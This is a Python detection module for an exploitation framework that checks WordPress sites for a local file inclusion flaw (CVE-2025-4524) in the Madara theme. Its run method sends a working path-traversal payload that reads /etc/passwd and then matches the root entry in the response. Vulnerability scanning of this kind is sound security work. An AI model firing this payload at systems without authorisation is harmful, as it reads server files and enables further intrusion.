#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Madara WordPress theme <= 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Madara Theme < 2.2.2.1 - Local File Inclusion Detection',
        'description': "Madara WordPress theme <= 2.2.2 contains a local file inclusion vulnerability caused by improper sanitization of the 'template' parameter, letting unauthenticated attackers execute arbitrary files on the server, exploit requires crafted request.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'modules': [
            'auxiliary/scanner/http/wordpress_madara_cve_2025_4524_lfi',
        ],
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp-theme', 'madara', 'lfi', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/a3ee01da-218a-421d-8f9c-1dc6c056ef74',
            'https://github.com/ptrstr/CVE-2025-4524',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-4524',
            'https://cxsecurity.com/issue/WLB-2026040012',
        ],
        'cve': 'CVE-2025-4524',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest'}, data='action=madara_load_more&page=1&template=plugins/../../../../../../../etc/passwd&vars[orderby]=meta_value_num&vars[paged]=1&vars[posts_per_page]=16&vars[post_type]=wp-manga&vars[post_status]=publish\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='WordPress Madara Theme < 2.2.2.1 - Local File Inclusion detected', path=path)
            return True
        return False

